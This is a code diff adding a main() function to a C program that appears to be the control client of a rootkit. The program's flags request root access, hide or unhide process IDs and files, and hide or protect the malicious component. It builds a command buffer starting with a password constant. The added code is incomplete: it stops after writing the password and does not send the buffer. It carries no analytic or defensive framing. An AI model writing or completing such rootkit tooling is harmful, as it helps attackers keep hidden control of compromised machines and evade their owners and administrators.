@@ -142,3 +142,55 @@ void write_buffer(char **dest_ptr, char *src, size_t size)
     memcpy(*dest_ptr, src, size);
     *dest_ptr += size;
 }
+
+int main(int argc, char **argv)
+{
+
+    int root;
+    int hide_pid;
+    int unhide_pid;
+    char *pid;
+    int hide_file;
+    int unhide_file;
+    char *file;
+    int hide;
+    int unhide;
+    int protect;
+    int unprotect;
+
+    handle_command_line_arguments(argc, argv, &root, &hide_pid, &unhide_pid, &pid,
+                                  &hide_file, &unhide_file, &file, &hide, &unhide,
+                                  &protect, &unprotect);
+
+    size_t buf_size = 0;
+
+    if (root) {
+        buf_size += sizeof(CFG_ROOT);
+    } else if (hide_pid) {
+        buf_size += sizeof(CFG_HIDE_PID) + strlen(pid);
+    } else if (unhide_pid) {
+        buf_size += sizeof(CFG_UNHIDE_PID) + strlen(pid);
+    } else if (hide_file) {
+        buf_size += sizeof(CFG_HIDE_FILE) + strlen(file);
+    } else if (unhide_file) {
+        buf_size += sizeof(CFG_UNHIDE_FILE) + strlen(file);
+    } else if (hide) {
+        buf_size += sizeof(CFG_HIDE);
+    } else if (unhide) {
+        buf_size += sizeof(CFG_UNHIDE);
+    } else if (protect) {
+        buf_size += sizeof(CFG_PROTECT);
+    } else if (unprotect) {
+        buf_size += sizeof(CFG_UNPROTECT);
+    }
+
+    buf_size += 1;
+
+    char *buf = malloc(buf_size);
+    buf[buf_size -1] = 0;
+
+    char *buf_ptr = buf;
+
+    write_buffer(&buf_ptr, CFG_PASS, sizeof(CFG_PASS));
+
+}
